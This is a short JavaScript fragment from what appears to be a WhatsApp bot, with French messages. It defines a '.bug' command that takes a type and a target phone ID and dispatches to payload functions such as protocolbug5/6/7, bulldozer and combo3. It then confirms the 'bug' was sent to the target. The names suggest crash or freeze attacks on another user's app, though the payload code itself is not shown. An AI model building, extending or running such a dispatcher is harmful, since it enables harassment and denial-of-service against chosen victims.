// ======================= Commande principale .bug =======================
export async function bugCommand(message, client, args) {
    const remoteJid = message.key.remoteJid;
    if (args.length < 2) {
        await channelSender(message, client, "❌ Utilisation : .bug <type> <target>\nTypes : audio, sticker, vid, bug6, bug7, bug5, combo3, combo2, bulldozerV2", "");
        return;
    }
    const type = args[0].toLowerCase();
    const target = args[1];
    const mention = args[2] === 'mention' ? true : false;

    try {
        switch (type) {
            case 'audio':
                await ProtoXAudio(target, mention, client);
                break;
            case 'sticker':
                await bulldozer(target, client);
                break;
            case 'vid':
                await protoXvid(target, mention, client);
                break;
            case 'bug6':
                await protocolbug6(target, mention, client);
                break;
            case 'bug7':
                await protocolbug7(target, mention, client);
                break;
            case 'bug5':
                await protocolbug5(target, mention, client);
                break;
            case 'combo3':
                await combo3(target, client);
                break;
            case 'combo2':
                await combo2(target, client);
                break;
            case 'bulldozerV2':
                await bulldozerV2(target, client);
                break;
            default:
                await channelSender(message, client, "❌ Type inconnu. Types : audio, sticker, vid, bug6, bug7, bug5, combo3, combo2, bulldozerV2", "");
        }
        await channelSender(message, client, `✅ Bug ${type} envoyé à ${target}`, "");
    } catch (error) {
        console.error(error);
        await channelSender(message, client, `❌ Erreur : ${error.message}`, "");
    }
}